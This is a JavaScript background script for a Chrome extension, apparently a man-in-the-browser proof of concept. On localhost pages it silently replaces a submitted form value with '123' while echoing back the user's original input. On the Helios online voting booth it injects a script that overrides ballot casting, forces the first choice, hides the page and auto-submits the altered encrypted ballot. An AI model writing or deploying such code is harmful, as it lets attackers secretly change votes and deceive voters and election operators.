function changeto()
{
	return '"123";';
}

function firstpag()
{
	return 'document.getElementById("mform").onsubmit = function(){'+
	'z=document.getElementById("num").value;'+
	'localStorage.setItem("bar",z);'+
	'document.getElementById("mform").style.display = "none";'+
	'document.getElementById("num").value='+changeto()+
	'document.getElementById("mform").submit();'+
	'};';
}
function dwpag()
{
	return 'x=localStorage.getItem("bar");'+
	'document.getElementById("num").value=x;'+
	'document.getElementById("mform").onsubmit = function(){'+
	'z=document.getElementById("num").value;'+
	'localStorage.setItem("bar",z);'+
	'document.getElementById("mform").style.display = "none";'+
	'document.getElementById("num").value='+changeto()+
	'document.getElementById("mform").submit();'+
	'};';
}
function twpag()
{
	return 'x=localStorage.getItem("bar");'+
	'document.getElementById("num").innerHTML=x;';
}
function votedes()
{
	return 'var script   = document.createElement("script");'+
'script.type  = "text/javascript";'+
'script.text  = "'+

'wyko=false;'+

'BOOTH.request_ballot_encryption = function() {'+
    '$.post(BOOTH.election_url + \'/encrypt-ballot\', {\'answers_json\': $.toJSON(BOOTH.ballot.answers)}, function(result) {'+
      'BOOTH.encrypted_ballot_with_plaintexts_serialized = result;'+
      'var ballot_json_obj = $.secureEvalJSON(BOOTH.encrypted_ballot_with_plaintexts_serialized);'+
     ' var answers = ballot_json_obj.answers;'+
     ' for (var i=0; i<answers.length; i++) {'+
     '    delete answers[i][\'answer\'];'+
      '   delete answers[i][\'randomness\'];'+
      '}'+
      'BOOTH.encrypted_ballot_serialized = JSON.stringify(ballot_json_obj);'+
      'BOOTH._after_ballot_encryption();'+
   ' });'+
'};'+




'BOOTH.cast_ballot=function(num){'+

'question_num=0;'+
'BOOTH.started_p = true;'+
 'if (question_num == BOOTH.election.questions.length -1)'+
 'BOOTH.all_questions_seen = true;'+
  'var answer_array = BOOTH.ballot.answers[question_num];'+
  'BOOTH.ballot.answers[question_num] = [];'+
  'var old_dirty = BOOTH.dirty[question_num];'+
  'BOOTH.click_checkbox(0,1,true);'+
  
  'BOOTH._after_ballot_encryption = function() {'+
  '$(\'body\').hide();'+
  'BOOTH.encrypted_vote_json = BOOTH.encrypted_ballot_serialized || JSON.stringify(BOOTH.encrypted_ballot.toJSONObject());'+
  'var do_hash = function() {'+
       'BOOTH.encrypted_ballot_hash = b64_sha256(BOOTH.encrypted_vote_json);'+
       'show_cast()'+
    '};'+
	
    'var show_cast = function() {'+
     ' $(\'#seal_div\').processTemplate({\'cast_url\': BOOTH.election.cast_url,'+
      '  \'encrypted_vote_json\': BOOTH.encrypted_vote_json,'+
       ' \'encrypted_vote_hash\' : BOOTH.encrypted_ballot_hash,'+
       ' \'election_uuid\' : BOOTH.election.uuid,'+
       ' \'election_hash\' : BOOTH.election_hash,'+
       ' \'election\': BOOTH.election,'+
       ' \'election_metadata\': BOOTH.election_metadata,'+
       ' \'questions\' : BOOTH.election.questions,'+
       ' \'choices\' : BALLOT.pretty_choices(BOOTH.election, BOOTH.ballot)});'+
      ' BOOTH.show($(\'#seal_div\'));'+
     ' BOOTH.encrypted_vote_json = null;'+
    '};'+
    'do_hash();'+
	'if(!wyko)wyko=true;'+
	'setTimeout(function() {'+
	'$(\'#loading_div\').show();'+
    '$(\'#proceed_button\').attr(\'disabled\', \'disabled\');'+
    'BOOTH.setup_ballot(BOOTH.election);'+
    'if (BOOTH.encrypted_ballot)'+
       'BOOTH.encrypted_ballot.clearPlaintexts();'+
    'BOOTH.encrypted_ballot_serialized = null;'+
    'BOOTH.encrypted_ballot_with_plaintexts_serialized = null;'+
    'BOOTH.audit_trail = null;'+
    'BOOTH.started_p = false;'+
    '$(\'#send_ballot_form\').submit();'+
	'},100);'+
	'};'+
	
  ' if (BOOTH.validate_question(question_num)) {'+
  'BOOTH.show_progress(\'2\');'+
  'if (!BigInt.in_browser) {'+
	'BOOTH.request_ballot_encryption()'+
  '} else {'+
	'BOOTH.seal_ballot_raw();'+
   '$(\'#percent_done_container\').show();'+
   '}'+
   '}'+
   
'}";'+
'document.body.appendChild(script);';
}

var myvar="0";
chrome.tabs.onUpdated.addListener( function (tabId, changeInfo, tab) {
	if (changeInfo.status == 'complete' && tab.active) {
		if(tab.url == "http://127.0.0.1/krypto.php")
		{
			chrome.tabs.executeScript({
				code: firstpag()
			});
		}
		else
		if(tab.url == "http://127.0.0.1/res.php")
		{
			chrome.tabs.executeScript({
				code: dwpag()
			});
		}
		else
		if(tab.url == "http://127.0.0.1/wk.php")
		{
			chrome.tabs.executeScript({
				code: twpag()
			});
		

		}
		else
		if(tab.url.includes("https://vote.heliosvoting.org/booth/vote.html")){
				chrome.tabs.executeScript({
					code: votedes()
				});
		}
		else
		if(tab.url == "http://127.0.0.1/test.php")
		{
			chrome.tabs.executeScript({
				code: votedes()
			});
		

		}
}
}
);